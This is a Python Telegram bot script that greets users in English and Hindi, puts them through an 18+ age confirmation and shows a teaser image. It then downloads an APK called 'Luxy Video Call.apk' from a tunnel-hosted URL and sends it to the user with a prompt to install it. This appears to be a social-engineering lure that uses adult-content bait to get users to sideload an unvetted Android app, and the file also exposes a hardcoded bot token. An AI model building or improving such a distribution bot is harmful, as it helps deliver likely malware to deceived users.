import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, ConversationHandler
)

# --- CONFIG ---
BOT_TOKEN = "8811475807:AAHZWvmxJERuXAkfzBPZVgk0Ec2sFegGHyE"

PRESET_MESSAGE = """✨ *Welcome! | नमस्ते!* ✨

Your content is ready — check below! 🎉
आपका कंटेंट तैयार है — नीचे देखें!"""

IMAGE_URL = "schat.jpg"  # Replace with your image
APK_URL = "https://playget.tail82be71.ts.net/s/QGl4jiigqPUMxO6n/dl"
APK_FILENAME = "Luxy Video Call.apk"

AGE_CHECK = 0

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [
            InlineKeyboardButton("✅  Yes | हाँ, मैं 18+ हूँ", callback_data="yes"),
            InlineKeyboardButton("❌  No | नहीं", callback_data="no"),
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "👋 *Welcome! | स्वागत है!*\n\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "Before we proceed, please confirm your age.\n"
        "आगे बढ़ने से पहले, कृपया अपनी आयु की पुष्टि करें।\n\n"
        "🔞 *Are you 18 or older? | क्या आप 18+ हैं?*\n"
        "━━━━━━━━━━━━━━━━━━",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )
    return AGE_CHECK


async def age_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "no":
        await query.edit_message_text(
            "━━━━━━━━━━━━━━━━━━\n"
            "❌ *Sorry! | खेद है!*\n\n"
            "You must be 18+ to proceed.\n"
            "आपको आगे बढ़ने के लिए 18+ होना आवश्यक है।\n\n"
            "▶️ Type /start to try again. | दोबारा /start टाइप करें।\n"
            "━━━━━━━━━━━━━━━━━━",
            parse_mode="Markdown"
        )
        return ConversationHandler.END

    chat_id = query.message.chat_id

    # Age verified — clean confirmation
    await query.edit_message_text(
        "━━━━━━━━━━━━━━━━━━\n"
        "✅ *Age Verified! | आयु सत्यापित!*\n\n"
        "Sending your content... | कंटेंट भेजा जा रहा है...\n"
        "━━━━━━━━━━━━━━━━━━",
        parse_mode="Markdown"
    )

    # Step 1 — Send preset message
    await context.bot.send_message(
        chat_id=chat_id,
        text=PRESET_MESSAGE,
        parse_mode="Markdown"
    )

    # Step 2 — Send image with uploading APK notice in caption
    try:
        await context.bot.send_photo(
            chat_id=chat_id,
            photo=IMAGE_URL,
            caption=(
                "🌟 *Welcome to the club! | क्लब में आपका स्वागत है!*\n\n"
                "Here's a sneak peek before your app arrives. 👀\n"
                "आपका ऐप आने से पहले एक झलक! 👀\n\n"
                "📦 *Uploading your APK... | APK अपलोड हो रही है...*"
            ),
            parse_mode="Markdown"
        )
    except Exception as e:
        logger.warning(f"Image send failed: {e}")

    # Step 3 — Fetch APK fresh from server and send
    try:
        response = requests.get(APK_URL, timeout=60)
        response.raise_for_status()

        await context.bot.send_document(
            chat_id=chat_id,
            document=response.content,
            filename=APK_FILENAME,
            caption=(
                "📲 *Your APK is ready! | आपका APK तैयार है!*\n\n"
                "Download and install it. Enjoy! 🎉\n"
                "डाउनलोड करें और इंस्टॉल करें। आनंद लें!"
            ),
            parse_mode="Markdown"
        )

        # Done
        await query.edit_message_text(
            "━━━━━━━━━━━━━━━━━━\n"
            "✅ *All done! | सब कुछ हो गया!*\n\n"
            "🎉 *Enjoy! | आनंद लें!*\n"
            "━━━━━━━━━━━━━━━━━━",
            parse_mode="Markdown"
        )

    except requests.exceptions.Timeout:
        await query.edit_message_text(
            "━━━━━━━━━━━━━━━━━━\n"
            "⚠️ *Server took too long. | सर्वर का जवाब देर से आया।*\n\n"
            "Please try again with /start.\n"
            "कृपया /start करके फिर से कोशिश करें।\n"
            "━━━━━━━━━━━━━━━━━━",
            parse_mode="Markdown"
        )
    except requests.exceptions.RequestException as e:
        logger.error(f"APK fetch failed: {e}")
        await query.edit_message_text(
            "━━━━━━━━━━━━━━━━━━\n"
            "❌ *APK unavailable. | APK उपलब्ध नहीं है।*\n\n"
            "Try again later with /start.\n"
            "बाद में /start करके फिर से कोशिश करें।\n"
            "━━━━━━━━━━━━━━━━━━",
            parse_mode="Markdown"
        )

    return ConversationHandler.END


async def fallback_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "━━━━━━━━━━━━━━━━━━\n"
        "👋 Type */start* to begin! | शुरू करने के लिए */start* टाइप करें!\n"
        "━━━━━━━━━━━━━━━━━━",
        parse_mode="Markdown"
    )


def main():
    app = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            AGE_CHECK: [CallbackQueryHandler(age_callback)],
        },
        fallbacks=[
            MessageHandler(filters.TEXT & ~filters.COMMAND, fallback_message)
        ],
    )

    app.add_handler(conv_handler)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, fallback_message))

    print("✅ Bot is running...")
    app.run_polling()


if __name__ == "__main__":
    main()
